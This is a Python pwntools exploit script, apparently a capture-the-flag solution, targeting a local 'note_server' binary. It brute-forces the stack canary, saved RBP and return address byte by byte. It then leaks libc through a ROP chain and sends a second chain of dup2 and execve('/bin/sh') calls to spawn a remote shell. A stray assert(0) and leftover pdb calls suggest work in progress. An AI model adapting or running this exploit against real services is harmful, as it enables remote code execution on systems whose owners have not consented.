#!/usr/bin/env python3

import sys
import time
from pwn import *
import pdb

def get_next_byte(s, r):

    for i in r:
        p = remote(host,port)
        p.recvuntil("Please enter the message you want to send to admin:\n")
        try:
            p.send(s + i.to_bytes(1,'big'))
            p.recvuntil('Done.', timeout=2)
            p.close()
            return i.to_bytes(1,'big')
        except EOFError:
            p.close()
    import pdb
    pdb.set_trace()
    print("Failed to find byte")


def brute_word(buff, num_bytes, obj, assumed=b''):
    start = time.time()
    result = assumed
    with log.progress(f'Brute forcing {obj}') as p:
        for i in range(num_bytes):
            current = '0x' + ''.join([f'{x:02x}' for x in result[::-1]]).rjust(16,'_')
            p.status(f'Found {len(result)} bytes: {current}')
            byte = None
            context.log_level = 'error'  # Hide "Opening connection" and "Closing connection" messages
            while byte == None:          # If no byte found, over range again
                byte = get_next_byte(buff + result, range(0,255))
            result = result + byte
            context.log_level = 'info'   # Re-enable logging
        p.success(f'Finished in {time.time() - start:.2f} seconds')

    log.success(f"{obj}:".ljust(20,' ') + f"0x{u64(result):016x}")
    return result

################################################################################
# ENTRY
################################################################################
if len(sys.argv) != 2 or sys.argv[1] not in ['local','remote']:
    print("Usage: %s [target]\ntarget is local or remote\n" % sys.argv[0])
    sys.exit(1)
target = sys.argv[1]

elf = context.binary = ELF('./note_server', checksec=False)
host = '127.0.0.1'
port = 5001


### Stage 0: Brute force addresses
log.info("Starting brute force")
exploit = b"\x01"*1032
#canary = brute_word(exploit, 8, 'Canary')
#le
canary = p64(0x0086c0115ecb16a7)

#be
#canary = p64(0xa716cb5e11c08600)
exploit += canary
print(exploit)
assert(0)


rbp = brute_word(exploit, 8, 'RBP')
#rbp = p64(0x00007ffdf7d5285c)
exploit += rbp

ret = brute_word(exploit, 7, 'Return Address', b'\x62')
#ret = p64(0x0000556ff9dd4562)


### Stage 1: Leak libc
# Gadgets
prog_base = u64(ret) - 0x1562
pop_rdi_ret = p64(0x164b + prog_base)
pop_rsi_r15_ret = p64(0x1649 + prog_base)
pop_rdx_ret = p64(0x1265 + prog_base)
write = p64(0x1050 + prog_base)
write_got = p64(0x4028 + prog_base)

junk = b"A"*56
exploit =  junk + canary + rbp

# write(4, write_got, 8)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += write_got
exploit += p64(0)
exploit += pop_rdx_ret
exploit += p64(8)
exploit += write

log.info("Sending exploit to leak libc write address")
p = remote(host, port)
p.recvuntil("Please enter the message you want to send to admin:\n")
p.send(exploit)
libc_write = p.recv(8, timeout=300)
log.success(f"libc write address: 0x{u64(libc_write):016x}")
p.close()

### Stage 2: Shell
# build rop

if target == 'local':
# readelf -s /lib/x86_64-linux-gnu/libc-2.29.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
#  1011: 00000000000ebf00    33 FUNC    WEAK   DEFAULT   14 dup2@@GLIBC_2.2.5
#  1509: 00000000000c7d60    33 FUNC    WEAK   DEFAULT   14 execve@@GLIBC_2.2.5
#  2271: 00000000000eb7d0   153 FUNC    WEAK   DEFAULT   14 write@@GLIBC_2.2.5
# strings -a -t x /lib/x86_64-linux-gnu/libc-2.29.so | grep /bin/sh
# 183cee /bin/sh
    dup2_offset   = 0xebf00
    execve_offset = 0xc7d60
    write_offset  = 0xeb7d0
    binsh_offset  = 0x183cee

else:
# readelf -s libc.so.6_ | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
#   999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
#  1491: 00000000000e4e30    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
#  2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
# strings -a -t x libc.so.6_  | grep /bin/sh
# 1b3e9a /bin/sh
    dup2_offset   = 0x1109a0
    execve_offset = 0xe4e30
    write_offset  = 0x110140
    binsh_offset  = 0x1b3e9a

libc_base = u64(libc_write) - write_offset
dup2 = p64(libc_base + dup2_offset)
binsh = p64(libc_base + binsh_offset)
execve = p64(libc_base + execve_offset)
log.success("Calculated addresses:")
print(f"    libc_base:          0x{libc_base:016x}")
print(f"    dup2:               0x{u64(dup2):016x}")
print(f"    execve:             0x{u64(execve):016x}")
print(f"    binsh:              0x{u64(binsh):016x}")

exploit =  junk + canary + rbp

# dup2(4,0)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(0)
exploit += p64(0)
exploit += dup2

# dup2(4,1)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(1)
exploit += p64(1)
exploit += dup2

# dup2(4,2)
exploit += pop_rdi_ret
exploit += p64(4)
exploit += pop_rsi_r15_ret
exploit += p64(2)
exploit += p64(2)
exploit += dup2

# execve("/bin/sh", 0, 0)
exploit += pop_rdi_ret
exploit += binsh
exploit += pop_rsi_r15_ret
exploit += p64(0)
exploit += p64(0)
exploit += pop_rdx_ret
exploit += p64(0)
exploit += execve

time.sleep(1)
log.info("Sending shell exploit")
p = remote(host, port)
p.recvuntil("Please enter the message you want to send to admin:\n")
p.send(exploit)
p.interactive()
p.close()
